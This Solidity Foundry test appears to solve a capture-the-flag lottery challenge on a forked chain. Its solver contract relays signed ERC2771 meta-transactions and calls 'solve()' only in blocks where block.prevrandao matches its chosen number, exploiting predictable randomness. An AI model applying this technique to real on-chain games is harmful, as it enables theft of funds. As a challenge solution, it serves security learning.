// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IPot} from "src/IPot.sol";
import {ERC2771Context} from "@openzeppelin/contracts/metatx/ERC2771Context.sol";
import {ERC2771Forwarder} from "@openzeppelin/contracts/metatx/ERC2771Forwarder.sol";

import {EIP712} from "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {Test, console} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";

import "src/FANG'S_POWERBALL_PARADISE/Challenge_Easy_2.sol";

contract CounterTest is Test {

    address public challenge = 0x786BeE5292B12AA79725cb66f0CBfb7E10A6CAc9;

    Vm.Wallet public user = vm.createWallet("user");

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 24908500);
    }

    function _testsolve2() public {
        ERC2771Forwarder forwarder = ERC2771Forwarder(ERC2771Context(challenge).trustedForwarder());
        console.log("Forwarder: ", address(forwarder));

        Challenge2Solver solver = new Challenge2Solver(challenge);

        vm.startPrank(user.addr);

        for (uint256 i = 0; i < 500; i++) {
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 1);

            (bytes32 digest, ERC2771Forwarder.ForwardRequestData memory requestData) = solver.buildNextDigest();
            if (digest == bytes32(0)) {
                console.log("Solved");
                break;
            }
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(user, digest);
            bytes memory signature = abi.encodePacked(r, s, v);
            requestData.signature = signature;

            solver.execute(requestData);

            vm.prevrandao(block.prevrandao + 1);
        }

        require(solver.isSolved(), "Challenge not solved yet.");
    }
}

contract Challenge2Solver {
    ChallengeEasy2 public challenge;

    constructor(address _challenge) {
        challenge = ChallengeEasy2(_challenge);
    }

    function execute(ERC2771Forwarder.ForwardRequestData memory request) public {
        if (winnings() == challenge.MIN_WINS()) {
            return;
        }
        if (startBlock() == 0) {
            ERC2771Forwarder(challenge.trustedForwarder()).execute(request);
            console.log("new game", winnings(), luckyNumber());
        } else if (startBlock() != block.number && luckyNumber() == (block.prevrandao % 26)) {
            console.log("solving game");
            ERC2771Forwarder(challenge.trustedForwarder()).execute(request);
        } else {
            //number is not right. wait for the next block
            console.log("Waiting for the next block...");
        }
    }

    function startBlock() public view returns (uint256 num) {
        (num,,) = challenge.games(msg.sender);
    }

    function luckyNumber() public view returns (uint256 num) {
        (, num,) = challenge.games(msg.sender);
    }

    function winnings() public view returns (uint256 win) {
        (,, win) = challenge.games(msg.sender);
    }
    function getNonces() public view returns (uint256) {
        return ERC2771Forwarder(challenge.trustedForwarder()).nonces(msg.sender);
    }

    function buildNextDigest()
        public
        view
        returns (bytes32 digest, ERC2771Forwarder.ForwardRequestData memory requestData)
    {
        bytes memory callData;
        if (winnings() == challenge.MIN_WINS()) {
            return (bytes32(0), requestData);
        }
        if (startBlock() == 0) {
            callData = abi.encodeWithSignature("start(uint256)", block.prevrandao % 26);            
        } else {
            callData = abi.encodeWithSignature("solve()");
        }

        requestData = ERC2771Forwarder.ForwardRequestData({
            from: msg.sender,
            to: address(challenge),
            value: 0,
            gas: 1000000,
            deadline: type(uint48).max,
            data: callData,
            signature: bytes("")
        });

        uint256 nonces = getNonces();

        bytes32 structHash = keccak256(
            abi.encode(
                keccak256(
                    "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint48 deadline,bytes data)"
                ),
                requestData.from,
                requestData.to,
                requestData.value,
                requestData.gas,
                nonces,
                requestData.deadline,
                keccak256(requestData.data)
            )
        );

        digest = MessageHashUtils.toTypedDataHash(getDomain(), structHash);
    }

    function getDomain() public view returns (bytes32) {
        (, string memory name, string memory version, uint256 chainId,,,) =
            ERC2771Forwarder(challenge.trustedForwarder()).eip712Domain();

        bytes32 domain = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes(name)),
                keccak256(bytes(version)),
                chainId,
                ERC2771Forwarder(challenge.trustedForwarder())
            )
        );
        return domain;
    }

    function isSolved() public view returns (bool) {
        return challenge.winnings(address(msg.sender)) == challenge.MIN_WINS();
    }
}
